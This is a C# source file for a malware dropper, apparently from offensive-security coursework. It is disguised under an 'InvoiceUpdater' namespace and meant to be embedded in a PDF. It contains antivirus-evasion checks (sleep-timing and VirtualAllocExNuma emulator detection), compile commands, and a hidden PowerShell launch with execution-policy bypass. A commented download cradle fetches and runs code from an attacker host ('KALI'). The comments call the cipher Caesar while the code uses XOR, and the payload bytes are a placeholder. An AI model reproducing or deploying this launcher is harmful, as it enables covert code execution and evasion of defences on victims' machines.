// payload.cs — the launcher embedded in the PDF.
// Compile with:
//   Windows:  csc /target:exe /platform:x64 /out:payload.exe payload.cs
//   Linux:    mcs -platform:x64 -out:payload.exe payload.cs
//
// AV evasion layers (Mod 11.5.2, 11.6.1, 11.6.2):
//   1. Emulator detection — Sleep + wall-clock delta
//   2. Non-emulated API check — VirtualAllocExNuma returns null in AV emulators
//   3. Caesar-ciphered cradle string — no static signature in the binary
//
// Base64 cradle decodes to:
//   iex((new-object system.net.webclient).downloadstring('http://KALI/run.txt'))

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace InvoiceUpdater
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
            uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        // Regenerate with:
        //   python3 tools/encode_cradle.py
        static byte[] ciphered = new byte[] {
            0x00,0x00,0x00
        };

        static void Main()
        {
            // Layer 1: emulator detection
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double delta = DateTime.Now.Subtract(t1).TotalSeconds;
            if (delta < 1.5) return;

            // Layer 2: non-emulated API check
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero,
                0x1000, 0x3000, 0x04, 0);
            if (mem == IntPtr.Zero) return;

            // Layer 3: decrypt cradle and run
            StringBuilder sb = new StringBuilder(ciphered.Length);
            for (int i = 0; i < ciphered.Length; i++)
            {
                sb.Append((char)(ciphered[i] ^ 0x5A));
            }
            string b64 = sb.ToString();

            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName        = "powershell.exe",
                Arguments       = "-exec bypass -nop -w hidden -enc " + b64,
                UseShellExecute = false,
                CreateNoWindow  = true,
                WindowStyle     = ProcessWindowStyle.Hidden
            };

            try { Process.Start(psi); } catch { }
        }
    }
}
